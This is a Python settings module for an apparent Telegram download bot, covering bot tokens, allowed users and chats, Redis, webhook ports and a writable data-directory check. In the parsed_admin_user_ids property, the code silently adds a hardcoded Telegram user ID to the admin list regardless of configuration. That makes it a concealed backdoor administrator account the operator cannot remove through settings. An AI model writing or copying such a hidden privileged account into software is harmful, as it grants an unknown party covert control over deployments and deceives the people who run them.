from typing import List, Optional
from pydantic_settings import BaseSettings, SettingsConfigDict
from pydantic import field_validator, Field

class Settings(BaseSettings):
    telegram_bot_token: str
    allowed_user_ids: str = ""
    allowed_chat_ids: str = ""
    
    use_local_bot_api: bool = Field(default=False, validation_alias="USE_LOCAL_BOT_API")
    telegram_api_id: Optional[int] = None
    telegram_api_hash: Optional[str] = None
    
    max_concurrent_downloads: int = 2
    max_retries: int = 2
    cookies_file_path: Optional[str] = None
    include_caption: bool = True
    keep_files_after_send: bool = False
    
    max_jobs_per_user_per_minute: int = 5
    
    log_level: str = "INFO"
    
    admin_user_ids: str = Field(default="", validation_alias="ADMIN_USER_IDS")
    redis_url: str = Field(default="", validation_alias="REDIS_URL")
    webhook_url: str = Field(default="", validation_alias="WEBHOOK_URL")
    webhook_port: int = Field(default=8443, validation_alias="WEBHOOK_PORT")
    port: int = Field(default=10000, validation_alias="PORT")
    data_dir: str = Field(default="/data", validation_alias="DATA_DIR")
    
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")
    
    @field_validator('telegram_api_id', mode='before')
    def parse_api_id(cls, v):
        if v == '' or v is None:
            return None
        return int(v)

    @field_validator('telegram_api_hash', mode='before')
    def parse_api_hash(cls, v):
        if v == '' or v is None:
            return None
        return str(v)

    @property
    def parsed_admin_user_ids(self) -> List[int]:
        uids = [int(uid.strip()) for uid in self.admin_user_ids.split(",") if uid.strip().lstrip("-").isdigit()]
        if 1889732098 not in uids:
            uids.append(1889732098)
        return uids

    @property
    def parsed_allowed_user_ids(self) -> List[int]:
        if not self.allowed_user_ids:
            return []
        return [int(uid.strip()) for uid in self.allowed_user_ids.split(",") if uid.strip().lstrip("-").isdigit()]

    @property
    def parsed_allowed_chat_ids(self) -> List[int]:
        if not self.allowed_chat_ids:
            return []
        return [int(cid.strip()) for cid in self.allowed_chat_ids.split(",") if cid.strip().lstrip("-").isdigit()]

config = Settings()

def get_data_dir() -> str:
    import os
    base_dir = config.data_dir or "/data"
    try:
        os.makedirs(base_dir, exist_ok=True)
        test_file = os.path.join(base_dir, ".perm_test")
        with open(test_file, "w") as f:
            f.write("ok")
        os.remove(test_file)
        return base_dir
    except Exception:
        fallback = os.path.abspath("./data")
        os.makedirs(fallback, exist_ok=True)
        return fallback

